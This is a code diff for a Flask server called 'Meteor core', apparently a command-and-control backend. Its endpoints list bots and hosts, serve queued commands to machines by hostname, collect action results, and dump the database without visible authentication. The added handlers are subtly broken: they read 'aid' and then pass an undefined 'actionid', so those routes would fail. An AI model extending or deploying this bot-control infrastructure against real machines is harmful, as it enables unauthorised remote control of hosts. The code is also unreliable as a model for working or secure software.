@@ -2,8 +2,8 @@ from flask import Flask, request
 from . import app
 from .utils import *
 
-@app.route('/')
-@app.route('/status')
+@app.route('/', methods=['GET'])
+@app.route('/status', methods=['GET'])
 def index():
     return "Meteor core is running.\n"
 
@@ -88,37 +88,56 @@ def newgroupaction():
 
 @app.route('/add/actionresult', methods=['POST'])
 def newactionres():
+    content = request.json
+    try:
+        aid = content['actionid']
+        data = content['data']
+    except:
+        return "Missing required field"
+    res = newActionResultUtil(actionid, data)
     return "success"
 
 @app.route('/get/command', methods=['POST'])
 def getcommand():
-    return "success"
+    content = request.json
+    try:
+        hostname = content['hostname']
+    except:
+        return "Missing required field"
+    cmds = getCommandUtil(hostname)
+    return cmds
 
 @app.route('/get/actionresult', methods=['POST'])
 def getactionresult():
+    content = request.json
+    try:
+        aid = content['actionid']
+    except:
+        return "Missing required field"
+    res = getActionResultUtil(actionid)
     return "success"
 
-@app.route('/list/bots')
+@app.route('/list/bots', methods=['GET'])
 def listbots():
     data = listBotsUtil()
     return data
 
-@app.route('/list/hosts')
+@app.route('/list/hosts', methods=['GET'])
 def listhosts():
     data = listHostsUtil()
     return data
 
-@app.route('/list/groups')
+@app.route('/list/groups', methods=['GET'])
 def listgroups():
     data = listGroupsUtil()
     return data
 
-@app.route('/list/actions')
+@app.route('/list/actions', methods=['GET'])
 def listactions():
     data = listActionsUtil()
     return data
 
-@app.route('/dumpdb')
+@app.route('/dumpdb', methods=['GET'])
 def dumpdb():
     data = dumpDatabase()
     return data
